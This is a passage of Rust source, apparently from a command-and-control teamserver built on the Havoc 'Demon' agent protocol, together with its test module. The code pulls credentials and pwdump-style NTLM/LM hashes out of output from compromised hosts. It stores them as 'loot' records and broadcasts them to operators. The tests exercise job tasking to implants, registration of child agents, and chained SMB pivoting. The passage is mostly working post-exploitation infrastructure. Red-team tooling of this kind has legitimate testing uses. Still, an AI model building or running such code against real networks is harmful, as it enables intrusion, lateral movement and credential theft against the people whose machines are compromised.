                    label: "credential-block".to_owned(),
                    content: current_block.join("\n"),
                    pattern: "keyword-block",
                });
                current_block.clear();
            }
            captures.push(CredentialCapture {
                label: "inline-credential".to_owned(),
                content: line.to_owned(),
                pattern: "inline-secret",
            });
            continue;
        }

        if looks_like_credential_line(line) {
            current_block.push(line.to_owned());
            continue;
        }

        if !current_block.is_empty() {
            captures.push(CredentialCapture {
                label: "credential-block".to_owned(),
                content: current_block.join("\n"),
                pattern: "keyword-block",
            });
            current_block.clear();
        }
    }

    if !current_block.is_empty() {
        captures.push(CredentialCapture {
            label: "credential-block".to_owned(),
            content: current_block.join("\n"),
            pattern: "keyword-block",
        });
    }

    let mut deduped = Vec::new();
    for capture in captures {
        if !deduped.iter().any(|existing: &CredentialCapture| existing.content == capture.content) {
            deduped.push(capture);
        }
    }
    deduped
}

fn looks_like_credential_line(line: &str) -> bool {
    let separators = [":", "="];
    separators.iter().any(|separator| {
        line.split_once(separator).is_some_and(|(key, value)| {
            let key = key.trim().to_ascii_lowercase();
            let value = value.trim();
            !value.is_empty()
                && [
                    "user", "username", "login", "domain", "password", "pass", "secret", "hash",
                    "ntlm", "lm", "ticket", "cred",
                ]
                .iter()
                .any(|keyword| key.contains(keyword))
        })
    })
}

fn looks_like_inline_secret(line: &str) -> bool {
    let bytes = line.as_bytes();
    let looks_like_windows_drive_path = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && matches!(bytes[2], b'\\' | b'/');

    if line.contains("://")
        || looks_like_windows_drive_path
        || (line.contains('\\') && !line.contains(':'))
    {
        return false;
    }

    line.split_once(':').is_some_and(|(left, right)| {
        let left = left.trim();
        let right = right.trim();
        !left.is_empty()
            && !right.is_empty()
            && !left.contains(' ')
            && !right.contains(' ')
            && (left.contains('\\')
                || left.contains('@')
                || (right.len() >= 8 && !looks_like_credential_line(line)))
    })
}

fn looks_like_pwdump_hash(line: &str) -> bool {
    let parts = line.split(':').collect::<Vec<_>>();
    parts.len() >= 6
        && parts[0].chars().all(|char| char.is_ascii_graphic())
        && parts[2].len() == 32
        && parts[3].len() == 32
        && parts[2].chars().all(|char| char.is_ascii_hexdigit())
        && parts[3].chars().all(|char| char.is_ascii_hexdigit())
}

async fn persist_credentials_from_output(
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    output: &str,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    for (index, credential) in extract_credentials(output).into_iter().enumerate() {
        let captured_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
        let record = insert_loot_record(
            database,
            LootRecord {
                id: None,
                agent_id,
                kind: "credential".to_owned(),
                name: format!("credential-{request_id:X}-{}", index + 1),
                file_path: None,
                size_bytes: Some(i64::try_from(credential.content.len()).unwrap_or(i64::MAX)),
                captured_at,
                data: Some(credential.content.as_bytes().to_vec()),
                metadata: Some(metadata_with_context(
                    [
                        ("pattern".to_owned(), Value::String(credential.pattern.to_owned())),
                        ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                    ],
                    context,
                )),
            },
        )
        .await?;
        events.broadcast(loot_new_event(&record, command_id, request_id, context)?);
        broadcast_credential_event(events, agent_id, &credential, context)?;
        if let Some(plugins) = plugins
            && let Err(error) = plugins.emit_loot_captured(&record).await
        {
            warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
        }
    }

    Ok(())
}

fn agent_response_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    output: Option<String>,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra_and_context(
        agent_id,
        command_id,
        request_id,
        kind,
        message,
        BTreeMap::new(),
        output.unwrap_or_default(),
        None,
    )
}

fn agent_response_event_with_extra(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    mut extra: BTreeMap<String, Value>,
    output: String,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra_and_context(
        agent_id,
        command_id,
        request_id,
        kind,
        message,
        std::mem::take(&mut extra),
        output,
        None,
    )
}

fn agent_response_event_with_extra_and_context(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    extra: BTreeMap<String, Value>,
    output: String,
    context: Option<&LootContext>,
) -> Result<OperatorMessage, CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let context = context.cloned().unwrap_or_default();
    let extra = agent_response_extra(extra, request_id, kind, message, &context);

    Ok(OperatorMessage::AgentResponse(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp,
            one_time: String::new(),
        },
        info: AgentResponseInfo {
            demon_id: format!("{agent_id:08X}"),
            command_id: command_id.to_string(),
            output,
            command_line: non_empty_option(&context.command_line),
            extra,
        },
    }))
}

fn agent_response_extra(
    mut extra: BTreeMap<String, Value>,
    request_id: u32,
    kind: &str,
    message: &str,
    context: &LootContext,
) -> BTreeMap<String, Value> {
    extra.insert("Type".to_owned(), Value::String(kind.to_owned()));
    extra.insert("Message".to_owned(), Value::String(message.to_owned()));
    extra.insert("RequestID".to_owned(), Value::String(format!("{request_id:X}")));
    if !context.operator.is_empty() {
        extra.insert("Operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        extra.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        extra.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
    }
    extra
}

fn non_empty_option(value: &str) -> Option<String> {
    if value.is_empty() { None } else { Some(value.to_owned()) }
}

fn parse_optional_kill_date(
    raw: u64,
    command_id: u32,
    field: &'static str,
) -> Result<Option<i64>, CommandDispatchError> {
    if raw == 0 {
        return Ok(None);
    }

    let parsed = i64::try_from(raw).map_err(|_| CommandDispatchError::InvalidCallbackPayload {
        command_id,
        message: format!("{field} exceeds i64 range"),
    })?;
    Ok(Some(parsed))
}

fn bool_string(value: bool) -> &'static str {
    if value { "true" } else { "false" }
}

fn job_type_name(job_type: u32) -> &'static str {
    match job_type {
        1 => "Thread",
        2 => "Process",
        3 => "Track Process",
        _ => "Unknown",
    }
}

fn job_state_name(state: u32) -> &'static str {
    match state {
        1 => "Running",
        2 => "Suspended",
        3 => "Dead",
        _ => "Unknown",
    }
}

struct CallbackParser<'a> {
    bytes: &'a [u8],
    offset: usize,
    command_id: u32,
}

impl<'a> CallbackParser<'a> {
    fn new(bytes: &'a [u8], command_id: u32) -> Self {
        Self { bytes, offset: 0, command_id }
    }

    fn is_empty(&self) -> bool {
        self.offset == self.bytes.len()
    }

    fn read_u32(&mut self, context: &'static str) -> Result<u32, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < 4 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected 4 bytes, got {remaining}"),
            });
        }

        let value =
            u32::from_le_bytes(self.bytes[self.offset..self.offset + 4].try_into().map_err(
                |_| CommandDispatchError::InvalidCallbackPayload {
                    command_id: self.command_id,
                    message: format!("{context}: failed to read u32"),
                },
            )?);
        self.offset += 4;
        Ok(value)
    }

    fn read_u64(&mut self, context: &'static str) -> Result<u64, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < 8 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected 8 bytes, got {remaining}"),
            });
        }

        let value =
            u64::from_le_bytes(self.bytes[self.offset..self.offset + 8].try_into().map_err(
                |_| CommandDispatchError::InvalidCallbackPayload {
                    command_id: self.command_id,
                    message: format!("{context}: failed to read u64"),
                },
            )?);
        self.offset += 8;
        Ok(value)
    }

    fn read_bool(&mut self, context: &'static str) -> Result<bool, CommandDispatchError> {
        Ok(self.read_u32(context)? != 0)
    }

    fn read_bytes(&mut self, context: &'static str) -> Result<Vec<u8>, CommandDispatchError> {
        let len = usize::try_from(self.read_u32(context)?).map_err(|_| {
            CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: length overflow"),
            }
        })?;
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < len {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected {len} bytes, got {remaining}"),
            });
        }

        let value = self.bytes[self.offset..self.offset + len].to_vec();
        self.offset += len;
        Ok(value)
    }

    fn read_fixed_bytes(
        &mut self,
        len: usize,
        context: &'static str,
    ) -> Result<Vec<u8>, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < len {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected {len} bytes, got {remaining}"),
            });
        }

        let value = self.bytes[self.offset..self.offset + len].to_vec();
        self.offset += len;
        Ok(value)
    }

    fn read_utf16(&mut self, context: &'static str) -> Result<String, CommandDispatchError> {
        let raw = self.read_bytes(context)?;
        if raw.len() % 2 != 0 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: utf16 length must be even"),
            });
        }

        let words = raw
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        Ok(String::from_utf16_lossy(&words).trim_end_matches('\0').to_owned())
    }

    fn read_string(&mut self, context: &'static str) -> Result<String, CommandDispatchError> {
        let raw = self.read_bytes(context)?;
        Ok(String::from_utf8_lossy(&raw).trim_end_matches('\0').to_owned())
    }
}

#[cfg(test)]
mod tests {
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use red_cell_common::crypto::{
        AGENT_IV_LENGTH, AGENT_KEY_LENGTH, ctr_blocks_for_len, decrypt_agent_data,
        encrypt_agent_data_at_offset,
    };
    use red_cell_common::demon::{
        DemonCallback, DemonCallbackError, DemonCommand, DemonConfigKey, DemonFilesystemCommand,
        DemonInfoClass, DemonInjectError, DemonJobCommand, DemonKerberosCommand, DemonMessage,
        DemonNetCommand, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand,
        DemonSocketType, DemonTokenCommand, DemonTransferCommand,
    };
    use red_cell_common::operator::OperatorMessage;
    use serde_json::Value;
    use tokio::{
        io::{AsyncReadExt, AsyncWriteExt},
        net::TcpStream,
        time::{Duration, timeout},
    };
    use zeroize::Zeroizing;

    use super::util::{
        windows_arch_label as checkin_windows_arch_label,
        windows_version_label as checkin_windows_version_label,
    };
    use super::{
        CommandDispatchError, CommandDispatcher, DownloadState, DownloadTracker,
        extract_credentials, looks_like_credential_line, looks_like_inline_secret,
        looks_like_pwdump_hash,
    };
    use crate::{AgentRegistry, Database, EventBus, Job, SocketRelayManager, TeamserverError};

    fn sample_agent_info(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> red_cell_common::AgentRecord {
        red_cell_common::AgentRecord {
            agent_id,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: red_cell_common::AgentEncryptionInfo {
                aes_key: Zeroizing::new(key.to_vec()),
                aes_iv: Zeroizing::new(iv.to_vec()),
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "lab".to_owned(),
            external_ip: "127.0.0.1".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            process_path: "C:\\Windows\\explorer.exe".to_owned(),
            base_address: 0x1000,
            process_pid: 1337,
            process_tid: 7331,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_build: 0,
            os_arch: "x64".to_owned(),
            sleep_delay: 10,
            sleep_jitter: 25,
            kill_date: None,
            working_hours: None,
            first_call_in: "2026-03-09T20:00:00Z".to_owned(),
            last_call_in: "2026-03-09T20:00:00Z".to_owned(),
        }
    }

    fn decode_pivot_payload(payload: &[u8]) -> Result<(u32, Vec<u8>), String> {
        if payload.len() < 12 {
            return Err("pivot payload too short".to_owned());
        }

        let subcommand = u32::from_le_bytes(
            payload[0..4].try_into().map_err(|_| "invalid pivot subcommand".to_owned())?,
        );
        if subcommand != u32::from(DemonPivotCommand::SmbCommand) {
            return Err(format!("unexpected pivot subcommand {subcommand}"));
        }

        let target_agent_id = u32::from_le_bytes(
            payload[4..8].try_into().map_err(|_| "invalid pivot target".to_owned())?,
        );
        let outer_len = usize::try_from(u32::from_le_bytes(
            payload[8..12].try_into().map_err(|_| "invalid pivot outer length".to_owned())?,
        ))
        .map_err(|_| "pivot outer length overflow".to_owned())?;
        let outer = payload
            .get(12..12 + outer_len)
            .ok_or_else(|| "pivot outer buffer truncated".to_owned())?;
        if outer.len() < 8 {
            return Err("pivot outer buffer too short".to_owned());
        }

        let inner_target = u32::from_le_bytes(
            outer[0..4].try_into().map_err(|_| "invalid pivot inner target".to_owned())?,
        );
        if inner_target != target_agent_id {
            return Err("pivot target mismatch".to_owned());
        }

        let inner_len = usize::try_from(u32::from_le_bytes(
            outer[4..8].try_into().map_err(|_| "invalid pivot inner length".to_owned())?,
        ))
        .map_err(|_| "pivot inner length overflow".to_owned())?;
        let inner =
            outer.get(8..8 + inner_len).ok_or_else(|| "pivot inner buffer truncated".to_owned())?;
        Ok((target_agent_id, inner.to_vec()))
    }

    fn add_length_prefixed_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
        buf.extend_from_slice(&u32::try_from(bytes.len()).unwrap_or_default().to_be_bytes());
        buf.extend_from_slice(bytes);
    }

    fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_be_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_length_prefixed_bytes(buf, &encoded);
    }

    fn add_checkin_string(buf: &mut Vec<u8>, value: &str) {
        add_bytes(buf, value.as_bytes());
    }

    fn add_checkin_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_bytes(buf, &encoded);
    }

    fn sample_checkin_metadata_payload(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        sample_checkin_metadata_payload_with_kill_date_and_working_hours(
            agent_id,
            key,
            iv,
            1_725_000_000,
            0x00FF_00FF,
        )
    }

    fn sample_checkin_metadata_payload_with_working_hours(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        working_hours: u32,
    ) -> Vec<u8> {
        sample_checkin_metadata_payload_with_kill_date_and_working_hours(
            agent_id,
            key,
            iv,
            1_725_000_000,
            working_hours,
        )
    }

    fn sample_checkin_metadata_payload_with_kill_date_and_working_hours(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        kill_date: u64,
        working_hours: u32,
    ) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&key);
        payload.extend_from_slice(&iv);
        add_u32(&mut payload, agent_id);
        add_checkin_string(&mut payload, "wkstn-02");
        add_checkin_string(&mut payload, "svc-op");
        add_checkin_string(&mut payload, "research");
        add_checkin_string(&mut payload, "10.10.10.50");
        add_checkin_utf16(&mut payload, "C:\\Windows\\System32\\cmd.exe");
        add_u32(&mut payload, 4040);
        add_u32(&mut payload, 5050);
        add_u32(&mut payload, 3030);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 0);
        add_u64(&mut payload, 0x401000);
        add_u32(&mut payload, 10);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 22_621);
        add_u32(&mut payload, 9);
        add_u32(&mut payload, 45);
        add_u32(&mut payload, 5);
        add_u64(&mut payload, kill_date);
        add_u32(&mut payload, working_hours);
        payload
    }

    fn valid_demon_init_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        let mut metadata = Vec::new();
        metadata.extend_from_slice(&agent_id.to_be_bytes());
        add_length_prefixed_bytes(&mut metadata, b"wkstn-01");
        add_length_prefixed_bytes(&mut metadata, b"operator");
        add_length_prefixed_bytes(&mut metadata, b"lab");
        add_length_prefixed_bytes(&mut metadata, b"10.0.0.25");
        add_length_prefixed_utf16(&mut metadata, "C:\\Windows\\explorer.exe");
        metadata.extend_from_slice(&1337_u32.to_be_bytes());
        metadata.extend_from_slice(&7331_u32.to_be_bytes());
        metadata.extend_from_slice(&512_u32.to_be_bytes());
        metadata.extend_from_slice(&2_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0x1000_u64.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&22000_u32.to_be_bytes());
        metadata.extend_from_slice(&9_u32.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&25_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u64.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());

        let encrypted = red_cell_common::crypto::encrypt_agent_data(&key, &iv, &metadata)
            .expect("metadata encryption should succeed");
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
            key.as_slice(),
            iv.as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        red_cell_common::demon::DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon init body: {error}"))
            .to_bytes()
    }

    fn pivot_connect_payload(inner: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
        payload.extend_from_slice(&1_u32.to_le_bytes());
        payload.extend_from_slice(&u32::try_from(inner.len()).unwrap_or_default().to_le_bytes());
        payload.extend_from_slice(inner);
        payload
    }

    #[tokio::test]
    async fn dispatch_returns_none_for_unregistered_commands()
    -> Result<(), Box<dyn std::error::Error>> {
        let dispatcher = CommandDispatcher::new();

        assert_eq!(dispatcher.dispatch(0x4141_4141, 0x9999, 7, b"payload").await?, None);
        assert!(!dispatcher.handles_command(0x9999));
        Ok(())
    }

    #[tokio::test]
    async fn custom_handlers_receive_agent_request_and_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::default();
        dispatcher.register_handler(0x1234, |agent_id, request_id, payload| {
            Box::pin(async move {
                let mut response = agent_id.to_le_bytes().to_vec();
                response.extend_from_slice(&request_id.to_le_bytes());
                response.extend_from_slice(&payload);
                Ok(Some(response))
            })
        });

        let response = dispatcher.dispatch(0xAABB_CCDD, 0x1234, 0x0102_0304, b"abc").await?;

        assert_eq!(
            response,
            Some([0xDD, 0xCC, 0xBB, 0xAA, 0x04, 0x03, 0x02, 0x01, b'a', b'b', b'c',].to_vec())
        );
        assert!(dispatcher.handles_command(0x1234));
        Ok(())
    }

    #[tokio::test]
    async fn dispatch_packages_concatenates_handler_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::new();
        dispatcher
            .register_handler(0x1111, |_, _, _| Box::pin(async move { Ok(Some(vec![1, 2])) }));
        dispatcher
            .register_handler(0x2222, |_, _, _| Box::pin(async move { Ok(Some(vec![3, 4])) }));

        let packages = vec![
            crate::DemonCallbackPackage { command_id: 0x1111, request_id: 1, payload: Vec::new() },
            crate::DemonCallbackPackage { command_id: 0x2222, request_id: 2, payload: Vec::new() },
        ];

        assert_eq!(dispatcher.dispatch_packages(0x1234_5678, &packages).await?, vec![1, 2, 3, 4]);
        Ok(())
    }

    #[tokio::test]
    async fn collect_response_bytes_concatenates_all_child_package_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::new();
        dispatcher.register_handler(0x1111, |_, _, _| {
            Box::pin(async move { Ok(Some(vec![0xAA, 0xBB])) })
        });
        dispatcher.register_handler(0x2222, |_, _, _| {
            Box::pin(async move { Ok(Some(vec![0xCC, 0xDD])) })
        });

        let child_packages = vec![
            crate::DemonCallbackPackage { command_id: 0x1111, request_id: 17, payload: Vec::new() },
            crate::DemonCallbackPackage { command_id: 0x2222, request_id: 18, payload: Vec::new() },
        ];

        assert_eq!(
            dispatcher.collect_response_bytes(0x8765_4321, &child_packages).await?,
            vec![0xAA, 0xBB, 0xCC, 0xDD]
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_get_job_handler_serializes_and_drains_jobs()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x55; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
            .await?
            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
        let message = red_cell_common::demon::DemonMessage::from_bytes(&response)?;

        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn builtin_get_job_wraps_linked_child_jobs_through_pivot_chain()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let root_id = 0x0102_0304;
        let pivot_id = 0x1112_1314;
        let child_id = 0x2122_2324;
        let root_key = [0x10; AGENT_KEY_LENGTH];
        let root_iv = [0x20; AGENT_IV_LENGTH];
        let pivot_key = [0x30; AGENT_KEY_LENGTH];
        let pivot_iv = [0x40; AGENT_IV_LENGTH];
        let child_key = [0x50; AGENT_KEY_LENGTH];
        let child_iv = [0x60; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(root_id, root_key, root_iv)).await?;
        registry.insert(sample_agent_info(pivot_id, pivot_key, pivot_iv)).await?;
        registry.insert(sample_agent_info(child_id, child_key, child_iv)).await?;
        registry.add_link(root_id, pivot_id).await?;
        registry.add_link(pivot_id, child_id).await?;
        registry
            .enqueue_job(
                child_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 77,
                    payload: vec![9, 8, 7, 6],
                    command_line: "sleep 5".to_owned(),
                    task_id: "task-77".to_owned(),
                    created_at: "2026-03-09T20:12:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;

        let response = dispatcher
            .dispatch(root_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
            .await?
            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
        let message = DemonMessage::from_bytes(&response)?;
        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandPivot));

        let first_layer = decrypt_agent_data(&root_key, &root_iv, &message.packages[0].payload)?;
        let (first_target, first_inner) = decode_pivot_payload(&first_layer)?;
        assert_eq!(first_target, pivot_id);

        let second_layer = DemonMessage::from_bytes(&first_inner)?;
        assert_eq!(second_layer.packages.len(), 1);
        let second_payload =
            decrypt_agent_data(&pivot_key, &pivot_iv, &second_layer.packages[0].payload)?;
        let (second_target, second_inner) = decode_pivot_payload(&second_payload)?;
        assert_eq!(second_target, child_id);

        let child_message = DemonMessage::from_bytes(&second_inner)?;
        assert_eq!(child_message.packages.len(), 1);
        assert_eq!(child_message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(child_message.packages[0].request_id, 77);
        assert_eq!(
            decrypt_agent_data(&child_key, &child_iv, &child_message.packages[0].payload)?,
            vec![9, 8, 7, 6]
        );
        Ok(())
    }

    #[tokio::test]
    async fn pivot_connect_callback_registers_child_and_link()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let parent_id = 0x4546_4748;
        let parent_key = [0x21; AGENT_KEY_LENGTH];
        let parent_iv = [0x31; AGENT_IV_LENGTH];
        let child_id = 0x5152_5354;
        let child_key = [0x41; AGENT_KEY_LENGTH];
        let child_iv = [0x51; AGENT_IV_LENGTH];

        registry
            .insert_with_listener(sample_agent_info(parent_id, parent_key, parent_iv), "http-main")
            .await?;

        let response = dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                17,
                &pivot_connect_payload(&valid_demon_init_body(child_id, child_key, child_iv)),
            )
            .await?;

        assert_eq!(response, None);
        assert_eq!(registry.parent_of(child_id).await, Some(parent_id));
        assert_eq!(registry.children_of(parent_id).await, vec![child_id]);
        assert!(registry.get(child_id).await.is_some());
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentNew event after pivot connect".to_owned())?;
        let red_cell_common::operator::OperatorMessage::AgentNew(message) = event else {
            return Err("expected AgentNew event after pivot connect".into());
        };
        assert_eq!(message.info.name_id, "51525354");
        assert_eq!(message.info.listener, "http-main");
        assert_eq!(message.info.pivots.parent.as_deref(), Some("45464748"));
        assert_eq!(message.info.pivots.links, Vec::<String>::new());
        assert_eq!(message.info.pivot_parent, "45464748");
        Ok(())
    }

    #[tokio::test]
    async fn pivot_connect_callback_child_snapshot_preserves_listener_provenance()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let parent_id = 0xAABB_CCDD;
        let parent_key = [0x11; AGENT_KEY_LENGTH];
        let parent_iv = [0x22; AGENT_IV_LENGTH];
        let child_id = 0x1122_3344;
        let child_key = [0x33; AGENT_KEY_LENGTH];
        let child_iv = [0x44; AGENT_IV_LENGTH];

        registry
            .insert_with_listener(
                sample_agent_info(parent_id, parent_key, parent_iv),
                "http-external",
            )
            .await?;

        dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                42,
                &pivot_connect_payload(&valid_demon_init_body(child_id, child_key, child_iv)),
            )
            .await?;

        // The child's persisted listener_name must match the parent's — not "null".
        assert_eq!(
            registry.listener_name(child_id).await.as_deref(),
            Some("http-external"),
            "child pivot listener_name must inherit the parent's listener, not be 'null'"
        );
        Ok(())
    }

    fn pivot_connect_failure_payload(error_code: u32) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
        payload.extend_from_slice(&0_u32.to_le_bytes()); // success == 0
        payload.extend_from_slice(&error_code.to_le_bytes());
        payload
    }

    #[tokio::test]
    async fn pivot_connect_callback_failure_broadcasts_error_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let parent_id = 0x1234_5678;
        let parent_key = [0xAA; AGENT_KEY_LENGTH];
        let parent_iv = [0xBB; AGENT_IV_LENGTH];
        registry
            .insert_with_listener(sample_agent_info(parent_id, parent_key, parent_iv), "http-main")
            .await?;

        // ERROR_ACCESS_DENIED = 5
        let response = dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                99,
                &pivot_connect_failure_payload(5),
            )
            .await?;

        assert_eq!(response, None, "failure path should return no agent response bytes");

        // No new agent should have been registered.
        assert_eq!(registry.children_of(parent_id).await, Vec::<u32>::new());

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected an operator event after pivot connect failure")?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err(format!("expected AgentResponse, got {event:?}").into());
        };
        assert_eq!(
            msg.info.demon_id,
            format!("{parent_id:08X}"),
            "event must be for the parent agent"
        );
